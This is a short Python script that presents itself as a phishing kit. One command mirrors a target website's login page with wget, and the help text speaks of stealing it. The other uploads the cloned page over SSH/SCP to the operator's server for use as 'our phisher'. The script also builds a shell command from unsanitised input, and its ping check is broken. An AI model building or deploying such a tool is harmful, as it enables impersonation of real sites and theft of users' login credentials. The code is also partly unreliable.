#!/usr/bin/env python3
import sys
import os
import time
import subprocess
import argparse
import scp
import paramiko
import getpass
from time import sleep
from paramiko import SSHClient
from scp import SCPClient
from urllib.parse import urlparse

parser = argparse.ArgumentParser()
parser.add_argument("action", type = str, choices = ["clone", "enable"])
parser.add_argument("website", help = "website of login page you want to steal OR website of your own site")
args = parser.parse_args()

def main():
    website = args.website
    # domain_pars = urlparse(website)
    # domain = '{uri.scheme}://{uri.netloc}/'.format(uri=domain_pars)
    # domain = domain[:-1]
    # for i in domain.iter():
    #     if domain[i] == "/" and domain[i+1] != "/":
    #         domain = domain[-1:]

    print("Attempting to contact website...")
    if website_test(website) == 0:
        print("ERROR: Could not contact website. Exiting...")
    else:
        print("Successfully contacted website")
        if args.action == "clone":
            return clone(website)
        elif args.action == "enable":
            return enable(website)
        else:
            return 0

def clone(website):
    print("Stealing login page from website...")
    web = subprocess.Popen(["wget --mirror --convert-links --adjust-extension --page-requisites --no-parent " + website], shell=True)
    # web.kill()
    # if web == True:
    #     print("Successfully stole website!")
    # else:
    #     print("Ru roh raggy")

def enable(website):
    print("Before starting our phisher we need your login info to upload to a server")
    user = input("Enter username: ")
    password = getpass.getpass("Enter password: ")
    port = input("Enter port: ")

    index = input("Enter filepath to desired index.html file: ")

    print("Uploading stolen website to personal website...")
    ssh = SSHClient()
    ssh.load_system_host_keys()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(website, port, user, password)

    scp = SCPClient(ssh.get_transport())
    scp.put(index)

    sleep(3)

    print("Website successfully uploaded, you may need to send it somewhere else in your home directory, however.")
    return 0

def website_test(website):
    print(website)

    status = subprocess.run(
    ['ping', '-q', '-c', '3', website],
    stdout=subprocess.DEVNULL)
    if status == 0:
        return 0
    else:
        return -1

if __name__ == "__main__":
    main()
